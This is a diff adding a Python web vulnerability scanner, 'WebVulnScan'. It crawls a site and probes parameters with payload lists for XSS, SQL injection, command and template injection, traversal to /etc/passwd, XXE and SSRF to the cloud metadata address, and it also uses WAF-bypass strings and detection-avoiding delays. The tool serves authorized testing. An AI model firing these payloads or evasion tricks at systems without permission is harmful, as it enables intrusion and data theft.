@@ -1,0 +1,543 @@
+#!/usr/bin/env python3
+"""
+WebVulnScan - Advanced Web Application Vulnerability Scanner
+
+A modular, extensible security tool for identifying and verifying vulnerabilities
+in web applications, APIs, and backend services.
+
+Features:
+- Comprehensive vulnerability detection
+- Intelligent payload generation
+- Controlled exploitation verification
+- Advanced crawling and input discovery
+- WAF bypass techniques
+- Detailed reporting
+
+Disclaimer:
+This tool is for authorized security testing only. Unauthorized use against
+systems you don't own or have permission to test is illegal.
+
+Usage:
+    python3 webvulnscan.py -u <target_url> [options]
+"""
+
+import argparse
+import json
+import random
+import re
+import sys
+import time
+import urllib.parse
+from base64 import b64encode
+from dataclasses import dataclass
+from enum import Enum, auto
+from typing import Dict, List, Optional, Tuple, Union
+
+import requests
+from bs4 import BeautifulSoup
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
+
+# Constants
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36"
+]
+
+# WAF bypass strings
+WAF_BYPASS_STRINGS = [
+    "/*!50000*/",
+    "/*!*/",
+    "/**/",
+    "%0a",
+    "%0d",
+    "%09",
+    "%20",
+    "%23"
+]
+
+# Payloads for various vulnerability tests
+PAYLOADS = {
+    "xss": [
+        "<script>alert('XSS')</script>",
+        "<img src=x onerror=alert('XSS')>",
+        "\"><script>alert('XSS')</script>",
+        "javascript:alert('XSS')"
+    ],
+    "sql": [
+        "' OR '1'='1",
+        "' OR 1=1--",
+        "admin'--",
+        "1 AND 1=1",
+        "1 AND SLEEP(5)",
+        "1 AND (SELECT * FROM (SELECT(SLEEP(5)))abc)"
+    ],
+    "rce": [
+        ";id",
+        "|id",
+        "`id`",
+        "$(id)",
+        "{{7*7}}",
+        "<% system('id') %>"
+    ],
+    "lfi": [
+        "../../../../etc/passwd",
+        "....//....//....//....//etc/passwd",
+        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+    ],
+    "xxe": [
+        "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>",
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]>"
+    ],
+    "ssrf": [
+        "http://localhost",
+        "http://127.0.0.1",
+        "http://169.254.169.254/latest/meta-data/"
+    ]
+}
+
+class Severity(Enum):
+    LOW = auto()
+    MEDIUM = auto()
+    HIGH = auto()
+    CRITICAL = auto()
+
+@dataclass
+class Vulnerability:
+    name: str
+    type: str
+    url: str
+    parameter: str
+    payload: str
+    severity: Severity
+    description: str
+    remediation: str
+    evidence: Optional[str] = None
+
+class Scanner:
+    """Main scanner class that orchestrates the scanning process"""
+    
+    def __init__(self, target_url: str, proxy: Optional[str] = None, rate_limit: float = 0.5):
+        self.target_url = target_url
+        self.proxy = {'http': proxy, 'https': proxy} if proxy else None
+        self.rate_limit = rate_limit
+        self.session = self._create_session()
+        self.crawled_urls = set()
+        self.vulnerabilities = []
+        
+    def _create_session(self) -> requests.Session:
+        """Create a configured requests session with retry logic"""
+        session = requests.Session()
+        retry = Retry(
+            total=3,
+            backoff_factor=1,
+            status_forcelist=[500, 502, 503, 504]
+        )
+        adapter = HTTPAdapter(max_retries=retry)
+        session.mount('http://', adapter)
+        session.mount('https://', adapter)
+        
+        # Set random user agent
+        session.headers.update({'User-Agent': random.choice(USER_AGENTS)})
+        
+        return session
+    
+    def _delay_request(self):
+        """Add delay between requests to avoid detection"""
+        time.sleep(self.rate_limit * random.uniform(0.8, 1.2))
+    
+    def _send_request(self, method: str, url: str, **kwargs) -> requests.Response:
+        """Send HTTP request with error handling and delay"""
+        self._delay_request()
+        
+        try:
+            response = self.session.request(method, url, proxies=self.proxy, **kwargs)
+            response.raise_for_status()
+            return response
+        except requests.RequestException as e:
+            print(f"[-] Request failed: {e}", file=sys.stderr)
+            raise
+    
+    def crawl(self, max_depth: int = 2) -> List[str]:
+        """Crawl the target website to discover URLs and input points"""
+        print(f"[*] Starting crawl of {self.target_url} (max depth: {max_depth})")
+        
+        to_crawl = [(self.target_url, 0)]
+        discovered_urls = set()
+        
+        while to_crawl:
+            url, depth = to_crawl.pop(0)
+            
+            if depth > max_depth:
+                continue
+                
+            if url in self.crawled_urls:
+                continue
+                
+            print(f"[*] Crawling: {url}")
+            
+            try:
+                response = self._send_request('GET', url)
+                self.crawled_urls.add(url)
+                
+                # Parse HTML for links
+                soup = BeautifulSoup(response.text, 'html.parser')
+                
+                # Find all links
+                for link in soup.find_all('a', href=True):
+                    href = link['href']
+                    absolute_url = urllib.parse.urljoin(url, href)
+                    
+                    if self.target_url in absolute_url and absolute_url not in discovered_urls:
+                        discovered_urls.add(absolute_url)
+                        to_crawl.append((absolute_url, depth + 1))
+                        
+                # Find forms
+                for form in soup.find_all('form'):
+                    form_url = urllib.parse.urljoin(url, form.get('action', url))
+                    if form_url not in discovered_urls:
+                        discovered_urls.add(form_url)
+                        to_crawl.append((form_url, depth + 1))
+                        
+            except requests.RequestException:
+                continue
+                
+        return list(discovered_urls)
+    
+    def scan_url(self, url: str):
+        """Scan a single URL for vulnerabilities"""
+        print(f"[*] Scanning URL: {url}")
+        
+        # Check for URL parameters
+        parsed = urllib.parse.urlparse(url)
+        query_params = urllib.parse.parse_qs(parsed.query)
+        
+        # Test each parameter for vulnerabilities
+        for param in query_params:
+            original_value = query_params[param][0]
+            
+            # Test for XSS
+            if self.test_xss(url, param, original_value):
+                print(f"[+] Potential XSS found in parameter: {param}")
+                
+            # Test for SQLi
+            if self.test_sqli(url, param, original_value):
+                print(f"[+] Potential SQL Injection found in parameter: {param}")
+                
+            # Test for RCE
+            if self.test_rce(url, param, original_value):
+                print(f"[+] Potential RCE found in parameter: {param}")
+                
+            # Test for LFI/RFI
+            if self.test_lfi(url, param, original_value):
+                print(f"[+] Potential LFI/RFI found in parameter: {param}")
+    
+    def test_xss(self, url: str, param: str, original_value: str) -> bool:
+        """Test for Cross-Site Scripting vulnerabilities"""
+        for payload in PAYLOADS['xss']:
+            modified_url = self._inject_payload(url, param, payload)
+            
+            try:
+                response = self._send_request('GET', modified_url)
+                
+                # Check if payload appears in response unencoded
+                if payload in response.text:
+                    vuln = Vulnerability(
+                        name="Cross-Site Scripting (XSS)",
+                        type="Client Side",
+                        url=url,
+                        parameter=param,
+                        payload=payload,
+                        severity=Severity.HIGH,
+                        description="The application appears to reflect user input without proper output encoding.",
+                        remediation="Implement proper output encoding (HTML, JavaScript, CSS) based on context. Use Content Security Policy (CSP).",
+                        evidence=f"Payload reflected in response: {payload}"
+                    )
+                    self.vulnerabilities.append(vuln)
+                    return True
+                    
+            except requests.RequestException:
+                continue
+                
+        return False
+    
+    def test_sqli(self, url: str, param: str, original_value: str) -> bool:
+        """Test for SQL Injection vulnerabilities"""
+        for payload in PAYLOADS['sql']:
+            modified_url = self._inject_payload(url, param, payload)
+            
+            try:
+                # Boolean-based test
+                true_response = self._send_request('GET', modified_url)
+                
+                # Time-based test
+                start_time = time.time()
+                self._send_request('GET', modified_url)
+                response_time = time.time() - start_time
+                
+                # Check for boolean-based indicators
+                if "error in your SQL syntax" in true_response.text.lower():
+                    vuln = Vulnerability(
+                        name="SQL Injection",
+                        type="Injection",
+                        url=url,
+                        parameter=param,
+                        payload=payload,
+                        severity=Severity.CRITICAL,
+                        description="The application appears vulnerable to SQL injection based on error messages.",
+                        remediation="Use parameterized queries or prepared statements. Implement proper input validation.",
+                        evidence="SQL error message detected in response"
+                    )
+                    self.vulnerabilities.append(vuln)
+                    return True
+                
+                # Check for time-based indicators
+                if response_time > 5:  # Arbitrary threshold
+                    vuln = Vulnerability(
+                        name="SQL Injection (Time-Based Blind)",
+                        type="Injection",
+                        url=url,
+                        parameter=param,
+                        payload=payload,
+                        severity=Severity.CRITICAL,
+                        description="The application appears vulnerable to time-based blind SQL injection.",
+                        remediation="Use parameterized queries or prepared statements. Implement proper input validation.",
+                        evidence=f"Delayed response detected ({response_time:.2f}s)"
+                    )
+                    self.vulnerabilities.append(vuln)
+                    return True
+                    
+            except requests.RequestException:
+                continue
+                
+        return False
+    
+    def test_rce(self, url: str, param: str, original_value: str) -> bool:
+        """Test for Remote Code Execution vulnerabilities"""
+        for payload in PAYLOADS['rce']:
+            modified_url = self._inject_payload(url, param, payload)
+            
+            try:
+                response = self._send_request('GET', modified_url)
+                
+                # Check for common RCE indicators
+                if "uid=" in response.text or "gid=" in response.text:
+                    vuln = Vulnerability(
+                        name="Remote Code Execution",
+                        type="Command Injection",
+                        url=url,
+                        parameter=param,
+                        payload=payload,
+                        severity=Severity.CRITICAL,
+                        description="The application appears to execute system commands based on user input.",
+                        remediation="Avoid passing user input directly to system commands. Use safe APIs instead of command execution.",
+                        evidence="Command output detected in response"
+                    )
+                    self.vulnerabilities.append(vuln)
+                    return True
+                    
+            except requests.RequestException:
+                continue
+                
+        return False
+    
+    def test_lfi(self, url: str, param: str, original_value: str) -> bool:
+        """Test for Local/Remote File Inclusion vulnerabilities"""
+        for payload in PAYLOADS['lfi']:
+            modified_url = self._inject_payload(url, param, payload)
+            
+            try:
+                response = self._send_request('GET', modified_url)
+                
+                # Check for common LFI indicators
+                if "root:" in response.text or "nobody:" in response.text:
+                    vuln = Vulnerability(
+                        name="Local File Inclusion",
+                        type="File Inclusion",
+                        url=url,
+                        parameter=param,
+                        payload=payload,
+                        severity=Severity.HIGH,
+                        description="The application appears to include local files based on user input.",
+                        remediation="Avoid using user input in file paths. Use whitelists for allowed files.",
+                        evidence="File contents detected in response"
+                    )
+                    self.vulnerabilities.append(vuln)
+                    return True
+                    
+            except requests.RequestException:
+                continue
+                
+        return False
+    
+    def _inject_payload(self, url: str, param: str, payload: str) -> str:
+        """Inject a payload into a URL parameter"""
+        parsed = urllib.parse.urlparse(url)
+        query_dict = urllib.parse.parse_qs(parsed.query)
+        
+        # Apply WAF bypass techniques randomly
+        if random.choice([True, False]):
+            payload = self._apply_waf_bypass(payload)
+        
+        # Encode payload if needed
+        if random.choice([True, False]):
+            payload = urllib.parse.quote(payload)
+        
+        query_dict[param] = [payload]
+        new_query = urllib.parse.urlencode(query_dict, doseq=True)
+        
+        return urllib.parse.urlunparse(parsed._replace(query=new_query))
+    
+    def _apply_waf_bypass(self, payload: str) -> str:
+        """Apply basic WAF bypass techniques to a payload"""
+        bypass = random.choice(WAF_BYPASS_STRINGS)
+        return f"{bypass}{payload}{bypass}"
+    
+    def generate_report(self, format: str = "text") -> str:
+        """Generate a vulnerability report in the specified format"""
+        if format == "json":
+            return json.dumps([v.__dict__ for v in self.vulnerabilities], indent=2)
+        elif format == "html":
+            return self._generate_html_report()
+        else:  # text
+            report = ["Vulnerability Report", "="*40, ""]
+            for vuln in self.vulnerabilities:
+                report.extend([
+                    f"Name: {vuln.name}",
+                    f"Type: {vuln.type}",
+                    f"URL: {vuln.url}",
+                    f"Parameter: {vuln.parameter}",
+                    f"Severity: {vuln.severity.name}",
+                    f"Payload: {vuln.payload}",
+                    f"Description: {vuln.description}",
+                    f"Remediation: {vuln.remediation}",
+                    f"Evidence: {vuln.evidence or 'N/A'}",
+                    ""
+                ])
+            return "\n".join(report)
+    
+    def _generate_html_report(self) -> str:
+        """Generate an HTML formatted report"""
+        html = """
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>WebVulnScan Report</title>
+            <style>
+                body { font-family: Arial, sans-serif; line-height: 1.6; margin: 0; padding: 20px; }
+                h1 { color: #333; }
+                .vulnerability { border: 1px solid #ddd; padding: 15px; margin-bottom: 20px; border-radius: 5px; }
+                .critical { background-color: #ffdddd; border-left: 5px solid #f44336; }
+                .high { background-color: #fff3cd; border-left: 5px solid #ff9800; }
+                .medium { background-color: #e7f3fe; border-left: 5px solid #2196F3; }
+                .low { background-color: #ddffdd; border-left: 5px solid #4CAF50; }
+                .severity { font-weight: bold; }
+            </style>
+        </head>
+        <body>
+            <h1>WebVulnScan Vulnerability Report</h1>
+            <p>Generated on: {datetime}</p>
+            <p>Target: {target}</p>
+        """.format(
+            datetime=time.strftime("%Y-%m-%d %H:%M:%S"),
+            target=self.target_url
+        )
+        
+        for vuln in self.vulnerabilities:
+            severity_class = vuln.severity.name.lower()
+            html += f"""
+            <div class="vulnerability {severity_class}">
+                <h2>{vuln.name}</h2>
+                <p><span class="severity">Severity:</span> <span class="{severity_class}">{vuln.severity.name}</span></p>
+                <p><span class="severity">URL:</span> {vuln.url}</p>
+                <p><span class="severity">Parameter:</span> {vuln.parameter}</p>
+                <p><span class="severity">Payload:</span> <code>{vuln.payload}</code></p>
+                <p><span class="severity">Description:</span> {vuln.description}</p>
+                <p><span class="severity">Remediation:</span> {vuln.remediation}</p>
+                <p><span class="severity">Evidence:</span> {vuln.evidence or 'N/A'}</p>
+            </div>
+            """
+        
+        html += """
+        </body>
+        </html>
+        """
+        
+        return html
+
+def parse_args():
+    """Parse command line arguments"""
+    parser = argparse.ArgumentParser(
+        description="WebVulnScan - Advanced Web Application Vulnerability Scanner",
+        epilog="Example: python3 webvulnscan.py -u https://example.com --crawl --scan --report-format html"
+    )
+    
+    parser.add_argument("-u", "--url", required=True, help="Target URL to scan")
+    parser.add_argument("--crawl", action="store_true", help="Enable crawling of the target website")
+    parser.add_argument("--scan", action="store_true", help="Enable vulnerability scanning")
+    parser.add_argument("--report-format", choices=["text", "json", "html"], default="text",
+                       help="Format of the report (default: text)")
+    parser.add_argument("--output", help="Output file for the report")
+    parser.add_argument("--proxy", help="Proxy server to use (e.g., http://localhost:8080)")
+    parser.add_argument("--rate-limit", type=float, default=0.5,
+                       help="Seconds to wait between requests (default: 0.5)")
+    parser.add_argument("--max-depth", type=int, default=2,
+                       help="Maximum crawl depth (default: 2)")
+    
+    return parser.parse_args()
+
+def disclaimer():
+    """Display the ethical disclaimer"""
+    print("""
+    WebVulnScan - Ethical Use Disclaimer
+    
+    This tool is designed for authorized security testing only. The use of this tool
+    against systems without explicit permission is illegal and unethical.
+    
+    By using this tool, you agree that:
+    1. You have permission to test the target system
+    2. You will not use this tool for malicious purposes
+    3. You will respect all applicable laws and regulations
+    
+    The developers of this tool are not responsible for any misuse or damage caused.
+    """)
+
+def main():
+    """Main function to run the scanner"""
+    args = parse_args()
+    disclaimer()
+    
+    # Verify target is not a production domain (basic check)
+    if args.url.lower().startswith(('https://prod', 'https://www.prod', 
+                                  'https://production', 'https://live')):
+        print("[!] Warning: The target appears to be a production environment.")
+        confirm = input("[?] Are you sure you have permission to scan this target? (y/N): ")
+        if confirm.lower() != 'y':
+            print("[*] Scan aborted by user.")
+            sys.exit(0)
+    
+    scanner = Scanner(args.url, args.proxy, args.rate_limit)
+    
+    if args.crawl:
+        discovered_urls = scanner.crawl(args.max_depth)
+        print(f"[*] Discovered {len(discovered_urls)} URLs")
+        
+        if args.scan:
+            for url in discovered_urls:
+                scanner.scan_url(url)
+    elif args.scan:
+        scanner.scan_url(args.url)
+    
+    # Generate and output report
+    report = scanner.generate_report(args.report_format)
+    
+    if args.output:
+        with open(args.output, 'w') as f:
+            f.write(report)
+        print(f"[*] Report saved to {args.output}")
+    else:
+        print(report)
+
+if __name__ == "__main__":
+    main()
